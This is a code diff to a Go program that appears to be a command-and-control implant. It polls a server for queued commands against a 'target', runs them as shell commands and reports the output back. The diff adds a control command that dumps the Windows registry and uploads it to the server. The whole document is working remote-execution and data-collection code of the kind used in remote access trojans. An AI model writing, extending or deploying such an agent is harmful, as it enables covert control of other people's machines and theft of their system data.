@@ -37,6 +37,10 @@ type Cmd_info struct{
 	Cmd_cycle_period_second int
 }
 
+const(
+	get_registry = "getRegistryInfo"
+)
+
 var server_addr = "http://127.0.0.1:8080/create_target"
 var get_target_info_addr = "http://127.0.0.1:8080/get_target_info/"
 var get_cmd_not_exec_info_addr = "http://127.0.0.1:8080/get_cmd_not_exec/"
@@ -96,15 +100,36 @@ func main(){
 		}else{
 			for _,cmd_info := range(cmd_infos){
 				log.Println(cmd_info)
-				cmd_info.Cmd_exec_result, err = runCmd(cmd_info.Cmd_value)
-				log.Println(cmd_info.Cmd_exec_result)
-				if err != nil{
-					log.Println(err)
-				}else{
-					cmd_info.Cmd_exec = true
-					cmd_info.Cmd_exec_time = time.Now()
-					data,_:=json.Marshal(cmd_info)
-					Send_info(update_cmd_not_exec_info_addr, string(data))
+				if cmd_info.Cmd_type == "cmd"{
+					cmd_info.Cmd_exec_result, err = runCmd(cmd_info.Cmd_value)
+					log.Println(cmd_info.Cmd_exec_result)
+					if err != nil{
+						log.Println(err)
+					}else{
+						cmd_info.Cmd_exec = true
+						cmd_info.Cmd_exec_time = time.Now()
+						data,_:=json.Marshal(cmd_info)
+						Send_info(update_cmd_not_exec_info_addr, string(data))
+					}
+				}else if cmd_info.Cmd_type == "control"{
+					switch cmd_info.Cmd_value {
+						case get_registry:
+							if Target_info_b.Target_base_info.System =="windows"{
+								registry_infos := Get_registry_infos()
+								var result string
+								for v,k := range(registry_infos){
+									k_result,_ := json.Marshal(k)
+									result += v+":"+string(k_result)+"\n"
+								}
+								cmd_info.Cmd_exec_result = string(result)
+							}else{
+								cmd_info.Cmd_exec_result = "Error:Only windows support registry!"
+							}
+							cmd_info.Cmd_exec = true
+							cmd_info.Cmd_exec_time = time.Now()
+							data,_:=json.Marshal(cmd_info)
+							Send_info(update_cmd_not_exec_info_addr,string(data))
+					}
 				}
 				delay_time_temp = delay_time
 			}
